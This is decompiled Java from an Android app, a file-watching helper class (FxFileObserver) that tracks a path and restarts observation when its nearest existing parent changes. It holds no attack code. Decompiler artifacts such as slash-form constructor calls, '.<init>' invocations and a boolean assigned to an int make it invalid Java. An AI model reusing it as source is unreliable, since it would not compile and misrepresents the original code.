package com.vvt.io;

import android.os.FileObserver;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import com.vvt.ak.a;
import java.io.File;

public class FxFileObserver
{
  private static final boolean a = false;
  private static final boolean b = a.b;
  private static final boolean c = a.c;
  private static final boolean d = a.e;
  private FileObserver e;
  private g f;
  private Handler g;
  private Looper h;
  private FxFileObserver.ObservingMode i;
  private String j;
  private String k;
  private String l;
  private Thread m;
  private int n;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
  }
  
  public FxFileObserver(String paramString1, String paramString2, g paramg)
  {
    Object localObject = FxFileObserver.ObservingMode.MODE_ALL_NOTIFY;
    this.i = ((FxFileObserver.ObservingMode)localObject);
    this.j = "FxFileObserver";
    localObject = null;
    this.n = 0;
    if ((paramString2 == null) || (paramg == null))
    {
      localObject = new java/lang/NullPointerException;
      ((NullPointerException)localObject).<init>("Constructor arguments cannot be NULL");
      throw ((Throwable)localObject);
    }
    this.j = paramString1;
    this.k = paramString2;
    this.f = paramg;
  }
  
  private String a(String paramString)
  {
    int i1 = 1;
    Object localObject1 = paramString.trim();
    Object localObject2 = "/";
    boolean bool1 = ((String)localObject1).startsWith((String)localObject2);
    if (bool1)
    {
      localObject2 = "/";
      str1 = "";
      localObject1 = ((String)localObject1).replaceFirst((String)localObject2, str1);
    }
    String[] arrayOfString = ((String)localObject1).split("/");
    localObject2 = "/";
    int i2 = arrayOfString.length;
    int i3 = 0;
    String str1 = null;
    String str2;
    Object localObject3;
    boolean bool2;
    if (i3 < i2)
    {
      str2 = arrayOfString[i3];
      localObject1 = ((String)localObject2).trim();
      localObject3 = "/";
      bool2 = ((String)localObject1).endsWith((String)localObject3);
      if (bool2) {
        break label196;
      }
      localObject3 = new Object[i1];
      localObject3[0] = localObject2;
    }
    label196:
    for (localObject1 = String.format("%s/", (Object[])localObject3);; localObject1 = localObject2)
    {
      localObject3 = "%s%s";
      int i5 = 2;
      Object[] arrayOfObject = new Object[i5];
      arrayOfObject[0] = localObject1;
      arrayOfObject[i1] = str2;
      str2 = String.format((String)localObject3, arrayOfObject);
      localObject1 = new java/io/File;
      ((File)localObject1).<init>(str2);
      bool2 = ((File)localObject1).exists();
      if (bool2)
      {
        int i4 = i3 + 1;
        i3 = i4;
        localObject2 = str2;
        break;
      }
      return (String)localObject2;
    }
  }
  
  private void e()
  {
    Object localObject = this.m;
    if (localObject == null)
    {
      localObject = new com/vvt/io/e;
      String str = "FileOT";
      ((e)localObject).<init>(this, str);
      this.m = ((Thread)localObject);
      localObject = this.m;
      ((Thread)localObject).start();
    }
  }
  
  private void f()
  {
    Looper localLooper = this.h;
    if (localLooper != null)
    {
      localLooper = this.h;
      localLooper.quit();
    }
    this.m = null;
  }
  
  private void g()
  {
    Object localObject = this.k;
    localObject = a((String)localObject);
    this.l = ((String)localObject);
    localObject = this.e;
    if (localObject != null)
    {
      localObject = this.e;
      ((FileObserver)localObject).stopWatching();
    }
    localObject = new com/vvt/io/h;
    String str1 = this.k;
    String str2 = this.l;
    FxFileObserver.ObservingMode localObservingMode = this.i;
    Handler localHandler = this.g;
    ((h)localObject).<init>(this, str1, str2, localObservingMode, localHandler);
    this.e = ((FileObserver)localObject);
    localObject = this.e;
    ((FileObserver)localObject).startWatching();
    boolean bool = b;
    if (bool) {}
  }
  
  private void h()
  {
    Object localObject1 = this.k;
    Object localObject2 = a((String)localObject1);
    localObject1 = this.l;
    boolean bool = ((String)localObject2).equals(localObject1);
    if (!bool) {
      bool = true;
    }
    for (;;)
    {
      if (bool)
      {
        bool = c;
        if (bool) {}
        localObject1 = this.e;
        if (localObject1 != null)
        {
          bool = a;
          if (bool) {}
          localObject1 = this.e;
          ((FileObserver)localObject1).stopWatching();
        }
        this.l = ((String)localObject2);
        bool = b;
        if (bool) {}
        localObject1 = this.k;
        localObject2 = this.l;
        bool = ((String)localObject1).equals(localObject2);
        if (bool)
        {
          localObject1 = this.g;
          int i1 = 256;
          ((Handler)localObject1).sendEmptyMessage(i1);
        }
        localObject1 = new com/vvt/io/h;
        String str1 = this.k;
        String str2 = this.l;
        FxFileObserver.ObservingMode localObservingMode = this.i;
        Handler localHandler = this.g;
        localObject2 = this;
        ((h)localObject1).<init>(this, str1, str2, localObservingMode, localHandler);
        this.e = ((FileObserver)localObject1);
        localObject1 = this.e;
        ((FileObserver)localObject1).startWatching();
        bool = a;
        if (!bool) {}
      }
      return;
      bool = false;
      localObject1 = null;
    }
  }
  
  public void a()
  {
    int i1 = a;
    if (i1 != 0) {}
    e();
    i1 = 0;
    Object localObject = null;
    Handler localHandler;
    do
    {
      localHandler = this.g;
      if (localHandler != null) {
        break;
      }
      int i3 = 5;
      if (i1 >= i3) {
        break;
      }
      int i2;
      i1 += 1;
      long l1 = 100;
      SystemClock.sleep(l1);
      localHandler = this.g;
    } while (localHandler == null);
    localObject = this.g;
    if (localObject == null)
    {
      localObject = new java/lang/RuntimeException;
      ((RuntimeException)localObject).<init>("Handler creating failed!!");
      throw ((Throwable)localObject);
    }
    g();
    boolean bool = a;
    if (bool) {}
  }
  
  public void a(int paramInt)
  {
    this.n = paramInt;
  }
  
  public void a(FxFileObserver.ObservingMode paramObservingMode)
  {
    this.i = paramObservingMode;
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    FileObserver localFileObserver = this.e;
    if (localFileObserver != null)
    {
      localFileObserver = this.e;
      localFileObserver.stopWatching();
      bool = a;
      if (!bool) {}
    }
    f();
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/io/FxFileObserver.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */